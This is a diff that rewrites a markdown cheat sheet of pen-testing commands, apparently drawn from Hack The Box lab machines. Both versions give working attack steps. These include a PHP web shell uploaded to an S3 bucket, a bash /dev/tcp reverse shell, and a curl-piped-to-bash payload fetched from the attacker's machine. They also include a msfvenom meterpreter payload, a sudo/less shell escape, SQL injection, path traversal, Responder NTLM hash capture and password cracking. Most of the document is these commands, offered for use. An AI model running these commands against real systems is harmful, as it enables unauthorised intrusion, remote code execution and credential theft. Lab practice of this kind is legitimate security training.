@@ -1,291 +1,200 @@
-# Pen-testing
-Pen-testing tips and tools
+### Pen-testing Tips and Tools
 
-### sudo
+#### `sudo` Exploitation
 
-sudo -l    → get all commands that can be run as sudo
+To get all commands that can be run with `sudo`:
+sudo -l
 
-can be exploited with less:
+It can be exploited with `less` to gain shell access.
 
-```nasm
-sudo /usr/bin/systemctl status trail.service
-sudo /usr/bin/systemctl status trail.service
-WARNING: terminal is not fully functional
--  (press RETURN)!/bin/bash
-!//bbiinn//bbaasshh!/bin/bash
-```
+#### `nmap` (Network Mapper)
 
-### nmap
+To probe open ports and check their service/version:
+nmap -sV {ip}
 
-Network mapper, check for open ports with service/version
 
-nmap -sV {ip}  → Probe open ports
+To check all ports:
+nmap -p- {ip}
 
-nmap -p-     → check ALL ports
 
-nmap -O     → OS detection
+To perform OS detection:
+nmap -O {ip}
 
-### telnet
 
+#### `telnet`
+
+Connect to a server using Telnet:
 telnet {ip}
 
-connect to server with telnet
 
-### ftp
+#### `ftp`
 
+Connect to a server using FTP. You can connect without an account by using the username "anonymous":
 ftp {ip}
 
-connect with ftp to server
 
-username: anonymous → connect without account
+#### `smbclient`
 
-### smbclient
+Used to connect to Windows environments over SMB/CIFS.
 
-used to connect to windows environments over SMB/CIFS 
+To list all available shares:
+smbclient -L {ip}
 
-smbclient //IPADDRESS
 
-smbclient -L //IPADDRESS → list all available shares
+To connect to a specific share:
+smbclient {ip}/share
 
-smbclient //IPADDRESS/share → connect to share docs
 
-then navigate in a shell
+#### `redis-cli`
 
-### redis-cli
+Used to connect to a Redis database.
 
-used to connect to redis database
+To access a remote Redis server:
+redis-cli -h {ip} -p {port}
 
-redis-cli -h {ip} -p {port}     → remote access
 
-SELECT 0    → select index database
+Some useful commands:
+- `SELECT 0`: Select index database.
+- `DBSIZE`: Get the size of the database.
+- `KEYS *`: Show all keys.
+- `GET {key}`: Show the content of a specific key.
 
-DBSIZE  → size of db
+#### `dirb`
 
-KEYS *   → show all keys
-
-GET {key}  →  show content of the key
-
-### dirb
-
-tool for scanning http pages
-
+A tool for scanning HTTP pages. You can specify a wordlist to discover directories and files on a website.
 dirb {url} /usr/share/wordlist
 
-dirb -X {extension}     →   .php .html  …
 
-### sql injection
+#### SQL Injection
 
-access to sql database through unsanitize input
+Exploiting SQL databases through unsanitized input.
+- Example: `admin'#` to comment out the rest of the SQL query.
 
-admin’#    → comment rest of line
+#### `mysql` and `MariaDB`
 
-### mysql
+To connect to SQL databases:
+mysql -h {ip} -u {user}
 
-connect to sql database
 
-mysql -h {ip} -u {user}    → with root can have all priv
+Some useful SQL commands:
+- `SHOW DATABASES;`
+- `USE {database};`
+- `SELECT * FROM {table};`
 
-MARIADB:
+#### File Inclusion Vulnerability
 
-SHOW database;
+Exploiting PHP scripts that include files from URLs without proper sanitization.
 
-USE database;
+#### `responder`
 
-SELECT * FROM {table};
+A tool for LLMNR, NBT-NS, and MDNS poisoning techniques, which involve intercepting and responding to network name resolution requests.
 
-### file inclusion vulnerability
-
-when a file is include() in a php script in an URL and not sanitized, ex:                                               http://url:80/index.php?page=french.html
-
-this can be exploited by giving paths
-
-page=../../../../../../../../windows/system32/drivers/etc/hosts
-
-### responder
-
-Responder an LLMNR, NBT-NS and MDNS poisoner. LLMNR, NBT-NS, and MDNS poisoner techniques involve intercepting and responding to network name resolution requests in order to redirect or manipulate network traffic
-
-LLMNR (Link-Local Multicast Name Resolution)
-
-NBT-NS (NetBIOS Name Service)
-
-MDNS (Multicast DNS)
-
+To run `responder`:
 sudo responder -I tun0
 
-launch the server and listen, then with a FIV, include the ip address of the server:
 
-http://unika.htb/index.php?page=//10.10.15.133/whatever
+You can use this to redirect or manipulate network traffic.
 
-You are able to get the hash + user of the site
+#### `john` (John the Ripper)
 
-[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
-[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER
+A tool for cracking password hashes.
 
-then try to break the hash → john
+To crack a hash:
+john hash.txt
 
-### john
 
-hash resolver
+You can also use a wordlist to crack the hash:
+john -w=/usr/share/wordlist hash.txt
 
-john hash.txt → find the hash algo and might resolve it
 
-john -w=/usr/share/wordlist hash.txt  → add a wordlist to try to break the hash
+#### `evil-winrm`
 
-rockyou.txt  → biggest leak of common passwords
-
-### evil-winrm
-
-exploit and control windows machines remotely
-
+Exploit and control Windows machines remotely.
 evil-winrm -i {ip} -u {user} -p {password}
 
-connect ssh-like to the machine
 
-strong with administrator connection
+This is particularly powerful with administrator access.
 
-### wappanalizer
+#### `wappanalizer`
 
-firefox extension to analyze website technology stack used
+A Firefox extension to analyze the technology stack used by websites.
 
-### gobuster
+#### `gobuster`
 
-fuzzer tool to find domains and dir of url with wordlists
+A fuzzer tool for finding domains and directories in URLs using wordlists.
 
-gobuster vhost → subdomain find
+To find subdomains:
+gobuster vhost -u {domain} -w {wordlist} --append-domain
 
-gobuster vhost -u {domain} -w {wordlist} —append-domain   →  
 
-GoBuster will send out requests with a host header that looks like the following for each word in the wordlist:  {word}.{domain}
+#### `nc` (Netcat)
 
-### Nc
-
-to listen for a reverse shell :
-
+To listen for a reverse shell:
 nc -lvnp {port}
 
-### awscli
 
-awscli is used to interact with aws servers/domains/buckets
+#### `awscli`
 
-aws —endpoint={url} {type} {command}
+Used to interact with AWS servers, domains, and S3 buckets.
 
-execute command to the endpoint
+To execute commands on an endpoint:
+aws --endpoint={url} {type} {command}
 
-└─$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb   → list all files
 
-we can also upload files to the bucket (script)   → 
+#### Reverse Shell in AWS S3
 
+If an AWS bucket is found, you can upload a script to execute commands on it.
+
+1. Create a PHP script that executes commands:
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 
+
+2. Upload the script to the bucket:
 aws --endpoint={url} s3 cp shell.php s3://thetoppers.htb
 
-### Reverse shell in awss3
 
-if a aws bucket is found and we can copy file inside s3 type
-
-aws configure  → enter arbitary value, need to be configured
-
-aws —endpoint={bucketUrl} {type} ls
-
-create a php script to exec commands:
-
-echo '<?php system($_GET["cmd"]); ?>' > shell.php
-
-command injection at:
-
-{url}/shell.php?cmd={cmd}
-
-upload the script:
-
-aws —endpoint={url} {type} cp shell.php {type}://url
-
-get our ip address with ifconfig and create a reverse shell script:
-
-```bash
+3. Create a reverse shell script and listen on your machine:
+Reverse shell script
 #!/bin/bash
 bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
-```
 
-listen with nc on our machine:  listen verbose [localhost](http://localhost) port
-
-```bash
+#### Netcat
 nc -nvlp 1337
-```
 
-`then lauch a web server on our machine:
 
-```bash
+4. Launch a web server on your machine and visit the URL:
 python3 -m http.server 8000
-```
+{url}/shell.php?cmd=curl%20<IP_ADDRESS>:8000/shell.sh|bash
 
-then visit the url:
 
-```bash
-{url}/shell.php?cmd=curl%20<IPADDRESS>:8000/shell.sh|bash
-```
+#### Metasploit
 
-It will then spawn a reverse shell on our netcat listening
+Set up a reverse TCP shell on a Windows MS-SQL server.
 
-```bash
-┌──(amuller㉿Laptop)-[/var/www]
-└─$ nc -nvlp 1337             
-listening on [any] 1337 ...
-connect to [10.10.15.133] from (UNKNOWN) [10.129.102.185] 52814
-bash: cannot set terminal process group (1382): Inappropriate ioctl for device
-bash: no job control in this shell
-www-data@three:/var/www/html$ cd ..
-cd ..
-```
-
-### Metaxploit
-
-setup of a reverse tcp shell on windows ms-sql:
-
-in msfvenom:
-
+In MSFVenom, create a payload:
 msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} -f exe -o payload.exe
 
-in msf6:
 
+In MSF6, use Metasploit:
 use exploit/multi/handler
-
 set payload /windows/meterpreter/reverse_tcp
-
-show options
-
 setg LHOST {ip}
-
 run
 
-### Burpsuite
 
-track all network and proxy
+#### Burp Suite
 
-add FoxyProxy extension :
+A tool to track all network and proxy traffic.
 
-http 127.0.0.1 8080
+You can use the FoxyProxy extension to intercept and modify requests.
 
-In burp you get all traffic to/from your target, and with repeater, can change the request
+#### Developer Mode
 
-### Developer mode
+You can use the browser's developer tools to inspect and modify cookies.
 
-Inspect → storage → cookie  = can modify the current cookies
+#### `wfuzz`
 
-### wfuzz
+An HTTP request fuzzer that uses wordlists to replace and try different parameters.
 
-http request fuzzer
-
-can specify wordlist and use FUZZ identifier to replace and try to get responses
-
-wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/test.txt --hc 404 http://10.10.11.224:55555/FUZZ
-
--z for worldist, don’t forget the file,
-
-—hc 404  ignore 404
-
--c colors
-
+Example with wordlist for file paths and parameters:
 wfuzz -c -z file,/usr/share/wfuzz/wordlist/injection/SQL.txt -d “username=1&password=FUZZ” --hc 404 http://10.10.11.224:55555/FUZZ
-
--d params to the request
